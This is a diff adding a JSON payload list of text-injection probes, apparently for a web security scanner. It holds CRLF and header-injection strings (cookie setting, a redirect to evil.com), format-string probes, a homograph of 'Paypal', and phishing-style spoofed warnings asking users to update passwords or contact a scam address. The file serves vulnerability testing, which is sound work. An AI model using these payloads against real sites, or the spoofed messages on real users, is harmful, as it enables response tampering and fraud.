@@ -1,0 +1,252 @@
+[
+  {
+    "id": "texti-001",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "\r\nINJECTED-TEXT-LINE",
+    "context": "string",
+    "description": "CRLF text injection to add new line with injected content",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-002",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "%0d%0aINJECTED-TEXT-LINE",
+    "context": "string",
+    "description": "URL-encoded CRLF text injection",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-003",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "TEXTI-PROBE-7734 - Your account has been suspended. Call +1-555-SCAM to restore access.",
+    "context": "string",
+    "description": "Social engineering text injection — content spoofing",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-004",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "TEXTI-SPOOFED-MESSAGE: Administrator message - please update your password at http://evil.com",
+    "context": "string",
+    "description": "Admin message spoof injection",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-005",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "\nINJECTED: Text Injection Confirmed",
+    "context": "string",
+    "description": "LF-only text injection (Unix line endings)",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-006",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "TEXTI-7734",
+    "context": "string",
+    "description": "Minimal text injection probe with unique marker for definitive reflection detection",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-007",
+    "family": "texti",
+    "subtype": "unicode_homograph",
+    "payload_string": "Ρ𝖺𝗒𝗉𝖺𝗅",
+    "context": "string",
+    "description": "Unicode homograph attack — visual spoofing with look-alike chars",
+    "references": ["https://en.wikipedia.org/wiki/IDN_homograph_attack"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-008",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "%0a%0dINJECTED-HEADER: evil",
+    "context": "string",
+    "description": "CRLF injection targeting response headers (from body params)",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-009",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "\\nWARNING: Your session has expired. Enter credentials below.",
+    "context": "string",
+    "description": "Escaped newline text injection for session expiry spoof",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-010",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "\r\n\r\nINJECTED-BODY: This content was injected by an attacker.",
+    "context": "string",
+    "description": "Double CRLF to inject into HTTP response body",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-011",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "TEXTI-CONFIRM: [INJECTED CONTENT - Text Injection Vulnerability Confirmed]",
+    "context": "string",
+    "description": "Clear marker text injection for scanner detection",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-012",
+    "family": "texti",
+    "subtype": "format_string",
+    "payload_string": "%s%s%s%s%s%n",
+    "context": "string",
+    "description": "Format string text injection probe",
+    "references": ["https://owasp.org/www-community/attacks/Format_string_attack"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-013",
+    "family": "texti",
+    "subtype": "format_string",
+    "payload_string": "{0}{1}{2}",
+    "context": "string",
+    "description": "Python/C# format string probe",
+    "references": ["https://owasp.org/www-community/attacks/Format_string_attack"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-014",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "INJECTED_PARAGRAPH\n\nThis content was injected. If you see this, the application is vulnerable to Text Injection.",
+    "context": "string",
+    "description": "Multi-line content spoofing injection",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-015",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "%E5%98%8A%E5%98%8DINJECTED-LINE",
+    "context": "string",
+    "description": "Unicode-encoded CRLF injection (CVE bypass)",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-016",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "SALE: 100% OFF all products! Use code: TEXTI-INJECTED",
+    "context": "string",
+    "description": "E-commerce content spoofing injection",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-017",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "Error 403: TEXTI-INJECTED - Your IP has been blocked.",
+    "context": "string",
+    "description": "Error message spoofing text injection",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-018",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "\r\nSet-Cookie: texti-injected=1; path=/",
+    "context": "string",
+    "description": "CRLF injection to set cookie via header injection",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-019",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "\r\nLocation: http://evil.com",
+    "context": "string",
+    "description": "CRLF injection for HTTP redirect via Location header",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-020",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "TEXTI-NULL\u0000AFTER-NULL",
+    "context": "string",
+    "description": "Null-byte text injection to test string truncation",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-021",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "ACCOUNT SUSPENDED - TEXTI-CONFIRMED - Contact support: hacker@evil.com",
+    "context": "string",
+    "description": "Account suspension spoof injection",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-022",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "TEXTI_MARKER_X9K2",
+    "context": "string",
+    "description": "Ultra-minimal unique marker — pure text injection probe",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-023",
+    "family": "texti",
+    "subtype": "crlf_text",
+    "payload_string": "foo%0d%0abar",
+    "context": "string",
+    "description": "Inline CRLF injection between valid content",
+    "references": ["https://owasp.org/www-community/attacks/CRLF_Injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-024",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "TEXTI-SPECIAL: <plain text> & 'single' \"double\" chars",
+    "context": "string",
+    "description": "Text injection with special chars to test encoding and rendering context",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  },
+  {
+    "id": "texti-025",
+    "family": "texti",
+    "subtype": "content_spoof",
+    "payload_string": "\\n\\n\\n====INJECTED_SECTION====\\nThis content was injected\\n================",
+    "context": "string",
+    "description": "Section break text injection with visual separators",
+    "references": ["https://portswigger.net/kb/issues/00200328_text-injection"],
+    "platform_specific": {}
+  }
+]
